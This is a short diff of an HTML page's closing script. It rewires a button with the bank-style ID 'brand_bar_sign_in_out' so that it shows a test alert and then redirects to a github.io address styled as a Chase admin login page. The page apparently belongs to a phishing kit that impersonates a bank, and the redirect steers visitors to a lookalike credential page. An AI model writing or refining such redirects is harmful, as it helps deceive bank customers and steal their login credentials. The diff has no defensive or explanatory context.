@@ -4879,13 +4879,12 @@
       })();
     </script>
     <script>
-  document.getElementById('signOutButton').addEventListener('click', function () {
-      // Perform any sign out logic here, if needed
-      // For example, clearing session data or calling an API
-
-      // Redirect to the homepage
-      window.location.href = 'https://secureadminauth.github.io/account.chase.admin_login_page/'; // Change this to your homepage URL
+    document.addEventListener('DOMContentLoaded', function () {
+        document.getElementById('brand_bar_sign_in_out').addEventListener('click', function () {
+            alert("Button clicked!"); // Test if the click is detected
+            window.location.href = 'https://secureadminauth.github.io/account.chase.admin_login_page/'; 
+        });
     });
-    </script>
+</script>
   </body>
 </html>
